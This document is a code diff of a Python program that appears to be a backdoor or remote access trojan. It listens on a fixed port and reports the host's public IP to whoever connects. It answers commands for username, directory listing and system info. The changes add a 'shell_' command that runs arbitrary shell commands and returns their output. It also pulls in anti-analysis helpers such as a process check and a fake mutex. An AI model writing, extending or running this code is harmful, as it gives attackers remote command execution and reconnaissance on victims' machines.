@@ -1,45 +1,42 @@
-import json, os, socket
+import json, os, subprocess, socket
 from resources.misc import sysinfo
-from socket import socket, AF_INET, SOCK_STREAM
 from resources.protection import proc_check, fake_mutex_code
 from requests import get
 
 port = 64780
-#host_IP = "127.0.0.1"  # need to be loopback
+connection = False
 
-if proc_check():
-    os.exit(0)
+#if proc_check():
+#    os.exit(0)
 
-with socket(AF_INET, SOCK_STREAM) as s:
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     s.bind(('', port))
-    #s.setblocking(False)
-    #s.listen(2)
-    #print("started listening")
-    #conn, addr = s.accept()
-
-    #try:
-    #    s.listen()
-    #    conn, addr = s.accept()
-    #    print("listening")
-    #    ip = get('https://api.ipify.org').text
-    #    conn.sendall(bytes(ip, encoding="utf-8"))
-    #except socket.error as msg:
-    #    s.close()
+    s.listen(2)
+    conn, addr = s.accept()
 
     while True:
-
+        cmnd = ""
         try:
-            s.listen()
-            conn, addr = s.accept()
-            print("listening")
-            ip = get('https://api.ipify.org').text
-            conn.sendall(bytes(ip, encoding="utf-8"))
+            if connection == False:
+                connection = True
+                ip = get('https://api.ipify.org').text
+                conn.sendall(bytes(ip, encoding="utf-8"))
+                cmnd = conn.recv(2048).decode('utf-8')
+                if not cmnd:
+                    continue
+
+            else:
+                cmnd = conn.recv(2048).decode()
+                if cmnd == "reset":
+                    connection = False
+                    while connection == False:
+                        s.listen(2)
+                        conn, addr = s.accept()
+                        connection = True
+
         except socket.error as msg:
             s.close()
             continue
-
-        cmnd = conn.recv(2048).decode()
-        print(cmnd)
 
         if cmnd.lower() == "kill":
             print("exiting")
@@ -51,11 +48,22 @@ with socket(AF_INET, SOCK_STREAM) as s:
             result = os.getlogin()
         elif cmnd.lower() == "listdir":
             result = json.dumps(os.listdir())
-            print (result)
         elif cmnd.lower() == "sysinfo":
             result = sysinfo()
+        elif cmnd.lower().startswith("shell_"):
+            try:
+                cmnd = "".join(cmnd.split("_")[1:])
+                print(cmnd)
+                result = subprocess.getoutput(cmnd)
+                print(result)
+            except Exception as e:
+                result = "command not found shell"
+                result = bytes(result, encoding="utf-8")
+
+            conn.sendall(bytes(result, encoding="utf-8"))
         else:
-            result = "passing"
-            continue
+            pass
+            # s.close()
+            # print("command not found")
 
         conn.sendall(bytes(result, encoding="utf-8"))
